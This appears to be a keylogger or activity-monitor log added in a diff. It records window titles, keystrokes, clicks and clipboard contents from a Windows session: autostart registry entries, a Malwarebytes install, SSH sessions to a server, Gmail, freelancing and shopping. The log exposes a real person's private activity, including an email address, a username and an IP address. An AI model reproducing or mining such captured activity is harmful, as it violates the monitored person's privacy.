+  Command  : %windir%\system32\SecurityHealthSystray.exe
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : WinZip UN
+  Command  : "C:\Program Files\WinZip\WZUpdateNotifier.exe" -show
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : WinZip FAH
+  Command  : C:\Program Files\WinZip\FAHConsole.exe
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : RTHDVCPL
+  Command  : "C:\Program Files\Realtek\Audio\HDA\RtkNGUI64.exe" -s
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : RtHDVBg_PushButton
+  Command  : "C:\Program Files\Realtek\Audio\HDA\RAVBg64.exe" /IM
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : WavesSvc
+  Command  : "c:\Program Files\Waves\MaxxAudio\WavesSvc64.exe" -Jack
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Logitech Download Assistant
+  Command  : C:\Windows\system32\rundll32.exe C:\Windows\System32\LogiLDA.dll,LogiFetch
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Logi Download Assistant
+  Command  : "C:\Program Files\LogiDownloadAssistant\bin\logi_download_assistant.exe" -system-restarted
+  Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  
+  
+  PS C:\Windows\system32> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
+  
+  
+  SecurityHealth              : C:\Windows\system32\SecurityHealthSystray.exe
+  WinZip UN                   : "C:\Program Files\WinZip\WZUpdateNotifier.exe" -show
+  WinZip FAH                  : C:\Program Files\WinZip\FAHConsole.exe
+  RTHDVCPL                    : "C:\Program Files\Realtek\Audio\HDA\RtkNGUI64.exe" -s
+  RtHDVBg_PushButton          : "C:\Program Files\Realtek\Audio\HDA\RAVBg64.exe" /IM
+  WavesSvc                    : "c:\Program Files\Waves\MaxxAudio\WavesSvc64.exe" -Jack
+  Logitech Download Assistant : C:\Windows\system32\rundll32.exe C:\Windows\System32\LogiLDA.dll,LogiFetch
+  Logi Download Assistant     : "C:\Program Files\LogiDownloadAssistant\bin\logi_download_assistant.exe" -system-restarted
+  PSPath                      : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  PSParentPath                : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion
+  PSChildName                 : Run
+  PSDrive                     : HKLM
+  PSProvider                  : Microsoft.PowerShell.Core\Registry
+  
+  Figma Agent                                              : "C:\Users\Artem\AppData\Local\FigmaAgent\figma_agent.exe"
+  Steam                                                    : "C:\Program Files (x86)\Steam\steam.exe" -silent
+  DAEMON Tools Lite Automount                              : "C:\Program Files\DAEMON Tools Lite\DTAgent.exe" -autorun
+  Microsoft Edge Update                                    : "C:\Users\Artem\AppData\Local\Microsoft\EdgeUpdate\1.3.251.5\MicrosoftEdgeUpdateCore.exe"
+  Battle.net                                               : "C:\Program Files (x86)\Battle.net\Battle.net.exe" --autostarted
+  Discord                                                  : "C:\Users\Artem\AppData\Local\Discord\Update.exe" --processStart Discord.exe --process-start-args "--start-inactive"
+  MicrosoftEdgeAutoLaunch_F16277FEC685AAB7CFECB93682CDF21A : "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
+  Viber                                                    : "C:\Users\Artem\AppData\Local\Viber\Viber.exe" AutoStart
+  EPLTarget\P0000000000000000                              : C:\Windows\system32\spool\DRIVERS\x64\3\E_YATISQE.EXE /EPT "EPLTarget\P0000000000000000" /M "L6160 Series"
+  com.squirrel.slack.slack                                 : "C:\Users\Artem\AppData\Local\slack\slack.exe" --process-start-args --startup
+  GoogleChromeAutoLaunch_DA475B33197C3B1BB4308C1E890946E6  : "C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window /prefetch:5
+  PSPath                                                   : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  PSParentPath                                             : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion
+  PSChildName                                              : Run
+  PSDrive                                                  : HKCU
+  PSProvider                                               : Microsoft.PowerShell.Core\Registry
+
+--- WINDOW  2026.07.27 11:20:18  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:20:21  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:20:21  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl]<[ENTER]
+  [LMB]
+  [Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl]
+  [Clipboard]
+  Malwarebytes
+  A
+  [LMB]
+
+--- WINDOW  2026.07.27 11:21:35  [chrome.exe] Нова вкладка - Google Chrome
+----------------------------------------------------------------------------
+  [Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl][Ctrl]<[ENTER]
+
+--- WINDOW  2026.07.27 11:21:40  [chrome.exe] Malwarebytes - Пошук Google - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:21:43  [chrome.exe] Free Virus Scanner | Check for malware and threats in 2026 - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:21:49  [chrome.exe] Спасибо за загрузку Malwarebytes для Windows | Malwarebytes - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:21:57  [chrome.exe] Нещодавня історія завантажень
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:21:58  [chrome.exe] Window Dialog
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:21:58  [chrome.exe] Спасибо за загрузку Malwarebytes для Windows | Malwarebytes - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:21:58  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:00  [chrome.exe] Спасибо за загрузку Malwarebytes для Windows | Malwarebytes - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:01  [MBSetup-1.1.exe] Malwarebytes Setup
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:36  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:36  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:22:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:42  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:43  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:44  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:46  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:48  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:22:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:24:54  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:24:55  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:24:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:24:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:24:58  [MBSetup-1.1.exe] Malwarebytes Setup
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:01  [(unknown)] Malwarebytes Setup
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:05  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:06  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:07  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:08  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:08  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:09  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:09  (no active window)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:25:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:12  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:13  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:15  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:17  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:18  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:19  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:20  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:21  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:24  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:26  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:27  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:28  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:29  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:30  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:31  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:32  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:33  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:34  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:35  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:36  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:37  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:38  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:39  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:40  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:42  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:25:42  [Malwarebytes.exe] Malwarebytes
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  4[Bk]
+
+--- WINDOW  2026.07.27 11:26:13  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:26:13  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:26:14  [chrome.exe] (29) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:26:15  [chrome.exe] Inbox (12,322) - testwebcapitan@gmail.com - Gmail - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:26:18  [chrome.exe] Gmail - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:26:24  [chrome.exe] Inbox (12,329) - testwebcapitan@gmail.com - Gmail - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [Clipboard]
+  testwebcapitan@gmail.com
+  [Ctrl]A
+
+--- WINDOW  2026.07.27 11:26:36  [Malwarebytes.exe] Malwarebytes
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:26:54  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:27:01  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:27:03  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+   
+
+--- WINDOW  2026.07.27 11:27:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:27:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:28:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:28:18  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:28:27  [chrome.exe] (28) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:28:42  [chrome.exe] (17) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:36:10  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:36:11  [Malwarebytes.exe] Malwarebytes
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:36:17  [Malwarebytes.exe] Malwarebytes Tray Notification
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:36:17  [Malwarebytes.exe] Malwarebytes
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:36:43  [Malwarebytes.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:36:45  [Malwarebytes.exe] Malwarebytes
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:36:54  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:36:54  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:36:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:36:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:36:58  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:36:59  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:01  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:02  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:03  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:05  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:06  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:06  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:09  [chrome.exe] Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:37:13  [chrome.exe] Відновити сторінки?
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:37:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:15  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:17  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:18  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:18  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:18  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:19  [chrome.exe] Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:37:22  [chrome.exe] Відновити сторінки?
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:37:23  [chrome.exe] (28) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:30  [chrome.exe] Нова вкладка - Google Chrome
+----------------------------------------------------------------------------
+  L75V
+
+--- WINDOW  2026.07.27 11:37:49  [chrome.exe] шампуть m pets - Пошук Google - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:51  [chrome.exe] Без імені - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:37:53  [chrome.exe] Купити M-Pets (М-Петс) Anti-fungal Shampoo Professional Care - Протигрибковий і протибактеріальний шампунь для собак та котів з різними типами шерсті: відгуки, опис - Київ - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:38:04  [chrome.exe] Без імені - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:38:05  [chrome.exe] Hola - Welcome - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:38:08  [chrome.exe] Купити M-Pets (М-Петс) Anti-fungal Shampoo Professional Care - Протигрибковий і протибактеріальний шампунь для собак та котів з різними типами шерсті: відгуки, опис - Київ - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:39:03  [chrome.exe] шампуть m pets - Пошук Google - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+  [MMB]
+  [LMB]
+  [LMB]
+  [MMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:39:35  [chrome.exe] шампунь m pets - Покупки Google - Google Chrome
+----------------------------------------------------------------------------
+  [MMB]
+  [MMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:40:09  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:10  [Malwarebytes.exe] Malwarebytes
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:40:15  [Malwarebytes.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:15  [chrome.exe] шампунь m pets - Покупки Google - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:17  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:18  [Malwarebytes.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:19  [Malwarebytes.exe] ModernTrayView
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:40:23  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:23  [SynTPEnh.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:26  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:27  [ShellExperienceHost.exe] Нове сповіщення
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:28  [chrome.exe] шампунь m pets - Покупки Google - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:29  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:29  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [v][ENTER]
+
+--- WINDOW  2026.07.27 11:40:32  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:33  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:34  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:35  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:36  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  = 
+
+--- WINDOW  2026.07.27 11:40:36  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [Bk]
+
+--- WINDOW  2026.07.27 11:40:37  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [Bk][v]
+
+--- WINDOW  2026.07.27 11:40:39  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:40:40  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  = ?
+
